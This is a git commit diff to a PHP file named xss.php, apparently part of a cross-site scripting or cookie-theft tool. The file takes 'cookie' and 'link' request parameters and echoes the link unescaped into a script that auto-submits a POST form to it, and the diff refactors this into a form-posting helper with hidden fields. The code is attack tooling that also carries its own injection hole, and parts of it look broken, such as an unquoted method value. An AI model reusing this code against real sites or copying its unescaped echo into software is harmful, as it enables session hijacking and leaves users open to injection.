aa6e3cc5cd2982089a4fed2afcf2d069ee0b0c3e
Federico <federicodebona@hotmail.it>
2019-12-13 08:44:10 +0100

    -

--- xss.php
+++ xss.php
@@ -3,11 +3,30 @@ $cookie = $_REQUEST['cookie'];
 $link = $_REQUEST['link'];
 echo "
 <script>
-const form = document.createElement('form');
-form.method = post;
-form.action = $link;
-document.body.appendChild(form);
-form.submit();
+function post(path, params, method='post') 
+{
+  const form = document.createElement('form');
+  form.method = method;
+  form.action = path;
+
+  for (const key in params) 
+  {
+    if (params.hasOwnProperty(key)) 
+    {
+      const hiddenField = document.createElement('input');
+      hiddenField.type = 'hidden';
+      hiddenField.name = key;
+      hiddenField.value = params[key];
+      hiddenField.target = '_parent';
+
+      form.appendChild(hiddenField);
+    }
+  }
+
+  document.body.appendChild(form);
+  form.submit();
+}
+post($link, {}, 'post');
 </script>";
 
 ?>
